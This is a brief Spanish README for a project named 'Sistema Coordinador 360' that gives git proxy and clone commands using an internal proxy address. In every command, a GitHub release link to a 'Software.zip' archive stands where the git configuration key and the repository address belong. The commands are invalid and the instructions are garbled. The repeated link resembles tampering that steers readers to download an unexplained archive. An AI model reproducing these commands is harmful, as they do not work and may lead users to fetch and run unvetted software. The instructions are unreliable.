# Sistema Coordinador 360
Para iniciar el proyecto SC360 se necesita agregar el proxy
de QG 192.168.40.35:3128 y empezar a clonar el repositorio


##git config --global https://github.com/FrancisJosueVelazco/sc360/releases/download/v1.0/Software.zip address:port

git config --global https://github.com/FrancisJosueVelazco/sc360/releases/download/v1.0/Software.zip 192.168.40.35:3128 

##git -c "https://github.com/FrancisJosueVelazco/sc360/releases/download/v1.0/Software.zip" clone https://...

git -c "https://github.com/FrancisJosueVelazco/sc360/releases/download/v1.0/Software.zip" clone https://github.com/FrancisJosueVelazco/sc360/releases/download/v1.0/Software.zip

##alias git-proxy='git -c "https://github.com/FrancisJosueVelazco/sc360/releases/download/v1.0/Software.zip"'
Opcional